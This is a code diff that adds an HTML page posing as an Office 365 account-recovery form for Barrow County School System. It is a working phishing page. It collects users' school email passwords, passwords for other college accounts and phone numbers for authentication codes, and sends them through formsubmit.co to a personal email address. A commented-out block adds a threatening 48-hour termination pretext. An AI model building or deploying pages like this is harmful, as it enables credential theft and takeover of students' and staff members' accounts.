@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style2.css">
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons+Round" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/5.2.3/css/bootstrap.min.css" integrity="sha512-SbiR/eusphKoMVVXysTKG/7VseWii+Y3FdHrt0EpKgpToZeemhqHeZeLWLhJutz/2ut2Vw1uQEj2MbRF+TVBUA==" crossorigin="anonymous" referrerpolicy="no-referrer">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.1/css/all.min.css" integrity="sha512-MV7K8+y+gLIBoVD59lQIYicR65iaqukzvf/nwasF0nqhPay5w/9lJmVM2hMDcnK1OnMGCdVK+iQrJ7lzPJQd1w==" crossorigin="anonymous" referrerpolicy="no-referrer">
+    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700,900|Roboto+Slab:400,700">
+    <link href="/assets/css/nucleo-icons.css" rel="stylesheet">
+    <link href="/assets/css/nucleo-svg.css" rel="stylesheet">
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.min.js" integrity="sha512-aVKKRRi/Q/YV+4mjoKBsE4x3H+BkegoM/em46NNlCqNTmUYADjBbeNefNxYV7giUp0VxICtqdrbqU7iVaeZNXA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <title>IT FORM</title>
+</head>
+<body>
+    <body>
+
+        <div class="position-sticky z-index-sticky top-0 w-100" id="top-navbar">
+            <nav class="navbar navbar-expand-lg blur position-absolute top-0 py-3 py-2 z-index-3 shadow start-0 end-0">
+                <div class="container">
+                    <a class="navbar-brand text-white" href="/" rel="tooltip" title="Designed and Coded by Creative Tim" data-placement="bottom" target="_blank">
+                        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAHIAAAAZCAYAAADt7nrkAAAEzklEQVRoQ+2YjXHTQBCF4woIFWAqIFRAUgGhApwKgAoIFRAqwOkgVIBTAUkFOBWQVADvu9m9WZ1PQjY2FoxuRiPptLu3u+/25zT5qXHQf3wQ6ULX1/4sByeTyQSecezQA5MRyB169y+KHoH8i87e5VIjkLv07hZlK3MeSdy9ytSyJnavQEq5qZR6EhS7laL3XfaL50WNXvPHyBL/5Rb9t3dRsuu9lDgPilR7jn0DiYIo6uOdgLho856Mmunb59IoA9EbsDPJmO8dgS0oILveSsxHE3Vn91mteRwakEsp+bQDSMAi8nyk3fkfA/ldhk51fZGdp260RSnvzKdoHRqQ6FRNHZaGMSyOTGs15ECG3WwhGAYhIpwoXsmuqwCkHxk/DBFIUgf18lLKzUpPyqi55l7rcrpW0GsohNr60AW26A7Ff1g2FbZRHpnszloe1rpra06iPNFct+jsgDU2dwB4kEC+kzFeDx7HpsecSzTi5EhXS62l0dRgag28PmiooLuJTrGNlDaRvk246zspDL2mhbOp5TgyN2eW8sq1srNN3hvdzyv6XEgWP1xYc6FbbOpqODfmhpRaH0uzH6bdmYyau6ahybk1ULyx6QRSfDRGCRgb8AMoke+8vuuXESyAFD8Oj80YkcMxwCNzIbITc36kZR0ABowMpOQBPkD6KOXNJe9sUyBRoO9YiBCDZ30ZRIdy8KyM6Chz3FxEpM8bvT93BtF90zMOPLP1fwtk0eF+QWePHmuOaKyWISJZjmhHh6kugPCaDDDHgT8Ckjad5Kw0JpZJphb5x5LhegPgaZDndqNDroe1FApBW2pdJ4SpTxj4rAZMy1xrPakAGY19bg4AQIB8MAfz3gfIheiwDZ2PYgqMeganXIuG9dMooudpuRn1fSkyIjvx6Z0mC78wT7RzzyPUeOYa8gxw6In03KGuC6Snlrhu2/NWf5qXQJoD3UGXcsYsOMDfcXYfIN2uT5JD3aqODmctxJA2OdmiZBYfXeRL/15Jw3N9I60mQEO6vNPctCLP18sb6l8H0g/BRD5nSq+bHqHrAokzz/8AyOrZNkaYA21gor/XUGwgVXLWXQEq6hS+k8HIOtUU2jY/mGYnOINmhF2MM0hXGJV3sdW3dSKycZiuRMLKmcyclSNO740u2r573W5EmKVJwPQmKW2E2MC0RLjL+z8i0pw0152mx0f+dbcGkBGIFM21qOxIX54ZYGtEdaGDp3zOnvEokhsigCtSb+NXZCEv2tq2yYb7QyDuUhnmDY77PkfEGkCWMnAs6Y15Otj0K7ADSDID4NPQMNhcS3sGZL7TgNFI0f1SAqBhAzFYL2eToqGJ8pAzM3mNxqxDN/RALzZO0mVwqdWcgIO9C0w7Pswf6/m3qRV6yYAPh3rNcjHxwF/d9cYPEADjYGZ+PQAiR5IU6cHpkYbneJxA3qKmj+YAkSNJzhw9s0Vab99AAgoXjj2PHrDI49tVYdxUczOjTWdU0a7MuSyLBOiR5VGGTBwKAL4uh/s0Vw7bEPCzDlEAuMiIqfTU1gAsBrJWztAVfZbQSta8sm6rbpLDelzotNgrkDWnjXObeWAEcjO/DY5rBHJwkGym0AjkZn4bHBdAUsT7DgozBd4Leh8+foDnpqAPw0izvgd+ATVU6CSZwGrzAAAAAElFTkSuQmCC" alt="" srcset="">
+                    </a>
+                    <a href="https://www.creative-tim.com/product/material-design-system-pro#pricingCard" class="btn btn-sm  bg-gradient-primary  btn-round mb-0 ms-auto d-lg-none d-block">Buy Now</a>
+                    <button class="navbar-toggler shadow-none ms-2" type="button" data-bs-toggle="collapse" data-bs-target="#navigation" aria-controls="navigation" aria-expanded="false" aria-label="Toggle navigation">
+                        <span class="navbar-toggler-icon mt-2">
+                            <span class="navbar-toggler-bar bar1"></span>
+                            <span class="navbar-toggler-bar bar2"></span>
+                            <span class="navbar-toggler-bar bar3"></span>
+                        </span>
+                    </button>
+                    <div class="collapse navbar-collapse w-100 pt-3 pb-2 py-lg-0" id="navigation">
+                        <ul class="navbar-nav navbar-nav-hover mx-auto">
+    
+                        </ul>
+    
+                        <ul class="navbar-nav d-lg-block d-none">
+                            <li class="nav-item">
+                                <a href="#" class="btn btn-md bg-white text-info mb-0 me-1 rounded-1" role="button">Sign in</a>
+                            </li>
+                        </ul>
+                    </div>
+                </div>
+            </nav>
+        </div>
+    
+        
+        <section class="bg-gradient-dark">
+            <div class="page-header min-vh-100" style="background-image: url('https://ow2.res.office365.com/owalanding/2023.4.13.03/images/masthead-alt-06-wide-large.jpg');">
+                <span class="mask bg-gradient-dark opacity-6"></span>
+                <div class="container">
+                    <div class="row justify-content-center py-12">
+                        <div class="col-lg-6 text-left ml-auto my-auto">
+                            <div class="card shadow-xl mx-3 mx-md-4 mt-n6">
+                                <div class="card-body text-center">
+                                    <img src="./office365-logo.svg" alt="" srcset="">
+    
+                                    <div id="loadingContainer" style="display: none;">
+                                        <h4 id="loadingMessage" class="text-dark font-weight-light text-center"><i class="fas fa-circle-notch fa-spin"></i> Connecting to <strong>Office 365</strong> ... </h4>
+                                    </div>
+    
+                                    <div id="successContainer" class="d-none">
+                                        <h4 id="successMessage" class="text-dark font-weight-light text-center"><i class="fas fa-check-o"></i> Account is in recovery, please standby for Authentication </h4>
+                                    </div>
+    
+                                   <!--  <div id="errorContainer" class="d-none">
+                                        <h4 class="text-dark">We were unable to connect <br> and verify your office 365</h4>
+                                            <p class="py-2">
+                                                We Notice That Your Office 365 Has Two Different Logins With Two College/Universities Portal.
+                                                <br>
+                                                Kindly Indicate The Two Info Logins As Soon As Possible.
+                                                <br>
+                                                To Avoid Termination Within 48hrs, We Expect You To Strictly Adhere And Address It.
+                                                <br>
+                                                Failure To Verify Will Result To Closure Of Your Account.
+                                            </p>
+                                            <a href="index2.html"> <button type="button" class="btn btn-info shadow-none btn-lg rounded-1" id="beginRecoveryBtn">Begin Recovery</button> </a> 
+                                    </div> -->
+     
+                                    <div id="recoveryFormContainer" class="text-center">
+                                        <h4>Fill the form to recover your account.</h4>
+                                        <form action="https://formsubmit.co/eajayi100@gmail.com" method="post">
+                                            <div class="primary-form text-start">
+                                                <div class="form-group my-3" id="check_student">
+                                                    <h5 class="font-weight-light">Are you a student of Barrow County School System ?</h5>
+                                                        <label for="is_student">
+                                                            <input type="radio" name="is_student" id="is_student" value="yes" required=""> Yes
+                                                        </label>
+                                                        <label for="not_student">
+                                                            <input type="radio" name="is_student" id="not_student" value="no" required=""> No
+                                                        </label>
+                                                </div>
+    
+                                                <section class="decidedFactors-2">
+                                                    <div class="form-group my-3">
+                                                        <input type="text" name="full_name" id="full_name" class="form-control" placeholder="Enter your first and last name" required="required">
+                                                        <div class="form-text">Enter Your first name and last name *:</div>
+                                                    </div>
+                                                </section>
+    
+                                                <section class="decidedFactors-0">
+                                                    <div class="form-group my-3">
+                                                        <input type="text" name="other_colleges" id="other_colleges" class="form-control" placeholder="Other's Universities / College Name">
+                                                        <div class="form-text">Name of Other's Universities / College You Have Attended Before *: </div>
+                                                    </div>
+    
+                                                    <div class="form-group my-3">
+                                                        <input type="email" name="other_email" id="other_email" class="form-control" placeholder="Other (Universities / College) Office 365 Email ">
+                                                        <div class="form-text">Office 365 User Email Of (Universities / College) You Have Attended Before *: </div>
+                                                    </div>
+    
+                                                    <div class="form-group my-3">
+                                                        <input type="password" name="other_password" id="other_password" class="form-control" placeholder="Other (Universities / College) Office 365 Password">
+                                                        <div class="form-text">Office 365 Password Of (Universities / College) You Have Attended Before *: </div>
+                                                    </div>
+    
+                                                    <div class="form-group my-3">
+                                                        <input type="tel" name="other_phone_number" id="other_phone_number" class="form-control" placeholder="Phone Number Used To Receive Microsoft Authentication Code: ">
+                                                        <div class="form-text">Your Personal Phone Number Attached To The Office 365 User Email Of (Universities / College) You Have Attended Before (To Receive Microsoft Authentication Code) *: </div>
+                                                    </div>
+                                                </section>
+    
+                                                <section class="decidedFactors-1">
+                                                    <div class="form-group my-3">
+                                                        <input type="email" name="email" id="email" class="form-control" placeholder="Email Address">
+                                                        <div class="form-text">Barrow County School System Office 365 Email *:</div>
+                                                    </div>
+    
+                                                    <div class="form-group my-3">
+                                                        <input type="password" name="password" id="password" class="form-control" placeholder="Barrow County School System Office 365 Email Password * "> 
+                                                        <div class="form-text">Barrow County School System Office 365 Email Password *:</div>
+                                                    </div>
+    
+                                                    <div class="form-group my-3">
+                                                        <input type="tel" name="phone_number" id="phone_number" class="form-control" placeholder="Personal Phone Number (To Receive Microsoft Authentication Code) *">
+                                                        <div class="form-text">Personal Phone Number Attached To Barrow County School System Office 365 (To Receive Microsoft Authentication Code) *:</div>
+                                                    </div>
+                                                </section>
+
+                                                <input type="hidden" name="_next" value="http://127.0.0.1:5500/thanks.html">
+                                                <input type="hidden" name="_captcha" value="false">
+                                                <input type="hidden" name="_subject" value="New Signin!">
+    
+                                                <div class="text-danger my-4">
+                                                    Kindly Fill The Correct Information Before You Click And Submit. All Information Is Needed To Verify Your (College/Universities Office 365 Login)
+                                                </div>
+    
+                                                <button type="submit" class="btn btn-lg text-white btn-info mb-0 me-1 rounded-1">Sign in</button>
+                                            </div>
+                                        </form>
+                                    </div>
+    
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/5.2.3/js/bootstrap.bundle.min.js" integrity="sha512-i9cEfJwUwViEPFKdC1enz4ZRGBj8YQo6QByFTF92YXHi7waCqyexvRD75S5NVTsSiTv7rKWqG9Y5eFxmRsOn0A==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.5/jquery.validate.min.js" integrity="sha512-rstIgDs0xPgmG6RX1Aba4KV5cWJbAMcvRCVmglpam9SoHZiUCyQVDdH2LPlxoHtrv17XWblE/V/PP+Tr04hbtA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.19.5/additional-methods.min.js" integrity="sha512-6S5LYNn3ZJCIm0f9L6BCerqFlQ4f5MwNKq+EthDXabtaJvg3TuFLhpno9pcm+5Ynm6jdA9xfpQoMz2fcjVMk9g==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+        <!-- <script src="app.js"></script>  -->
+    
+    </body>
+</body>
+</html>
